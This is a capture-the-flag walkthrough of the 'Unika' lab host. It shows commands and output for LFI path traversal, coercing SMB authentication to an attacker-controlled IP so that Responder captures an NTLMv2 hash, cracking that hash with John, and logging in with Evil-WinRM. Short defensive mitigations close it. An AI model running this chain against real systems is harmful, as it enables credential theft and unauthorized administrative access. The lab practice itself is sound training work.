# HTB Walkthrough: Unika — LFI to Responder (NTLMv2) to cracked credentials and Evil-WinRM

This host demonstrates **reconnaissance → LFI → forced SMB authentication → offline NTLM cracking → administrative WinRM**.

---

## Step 1 — Port scan

Enumerate exposed services:

```bash
nmap 10.129.95.234
```

Typical findings:

- **TCP 80** — web application
- **TCP 5985** — WinRM (useful if credentials are recovered)

---

## Step 2 — LFI confirmation

Browse: `http://unika.htb/`

Test path traversal on the `page` parameter, for example:

```http
http://unika.htb/index.php?page=../../../../../../../../../../../../windows/system32/drivers/etc/hosts
```

If the response contains `hosts` content, the application is vulnerable to **local file inclusion (LFI)** via unsanitized file paths.

---

## Step 3 — Responder listener

Force the server to authenticate to your machine over SMB and capture **NetNTLMv2**:

```bash
responder -I tun0
```

`-I tun0` selects the interface where Responder listens (adjust to your VPN interface).

---

## Step 4 — Trigger SMB authentication from LFI

Point the vulnerable parameter at an SMB URI on your host:

```http
http://unika.htb/index.php?page=//10.10.14.123/something
```

The `//HOST/...` form can cause the PHP runtime on Windows to perform an SMB connection back to you.

**Example Responder output:**

```text
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:31d0c9ef14ecdfa3:...
```

You now have an **offline-cracking candidate** for the `Administrator` account (NetNTLMv2).

---

## Step 5 — Save the hash

Store the captured line exactly as Responder prints it:

```bash
echo "Administrator::RESPONDER:31d0c9ef14ecdfa3:84CAACDE4EDCBFFF575B4CC9984B3AEA:010100000000000000DCD3E54FECDB013EC34A1B2F4192350000000002000800530052003300310001001E00570049004E002D0034005700480045004E004600540042004A005500330004003400570049004E002D0034005700480045004E004600540042004A00550033002E0053005200330031002E004C004F00430041004C000300140053005200330031002E004C004F00430041004C000500140053005200330031002E004C004F00430041004C000700080000DCD3E54FECDB01060004000200000008003000300000000000000001000000002000000486763F93F8E248DA93D39CD803C7D6FF0B38D113F400253279E74DDBDDACDD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320033000000000000000000" > hash.txt
```

(Replace with your captured hash line.)

---

## Step 6 — Offline cracking (John)

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

**Example result:**

```text
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
```

Recovered password (example): **`badminton`**

---

## Step 7 — WinRM shell (Evil-WinRM)

```bash
evil-winrm -i 10.129.95.234 -u administrator -p badminton
```

**Access:** administrative WinRM session. Collect required proof files (for example `user.txt` / `root.txt` equivalents) per the lab.

---

## Step 8 — Flag location (example)

```powershell
cd C:\Users\mike\Desktop
dir
```

```text
-a----         3/10/2022   4:50 AM             32 flag.txt
```

---

## Command summary

```bash
nmap 10.129.95.234

responder -I tun0

# Browser / curl:
http://unika.htb/index.php?page=//10.10.14.123/something

echo "<HASH_LINE_FROM_RESPONDER>" > hash.txt

john -w=/usr/share/wordlists/rockyou.txt hash.txt

evil-winrm -i 10.129.95.234 -u administrator -p badminton
```

---

## Defensive notes

This chain depends on:

- **LFI** allowing attacker-controlled resource paths
- **Outbound SMB** from the web server to attacker-controlled hosts
- **Weak or guessable** credentials for high-privilege accounts
- **WinRM** exposed where administrative reuse is possible

Mitigations include strict outbound filtering, SMB signing requirements where appropriate, least-privilege service accounts, and eliminating include-on-user-input patterns in web code.
